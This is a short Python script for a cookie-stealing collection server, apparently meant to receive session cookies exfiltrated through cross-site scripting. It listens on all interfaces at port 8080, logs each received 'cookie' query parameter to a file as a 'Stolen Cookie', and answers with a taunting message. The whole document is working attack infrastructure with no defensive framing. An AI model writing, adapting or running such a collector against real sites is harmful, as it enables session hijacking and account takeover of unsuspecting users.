from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class CookieLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed_path.query)
        cookie = query.get("cookie", [""])[0]
        
        with open("cookies.txt", "a") as file:
            file.write(f"Stolen Cookie: {cookie}\n")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Cookie received. Thanks for your donation!")

if __name__ == "__main__":
    server_address = ("0.0.0.0", 8080)
    httpd = HTTPServer(server_address, CookieLoggerHandler)
    print("Listening on port 8080... Waiting for cookies")
    httpd.serve_forever()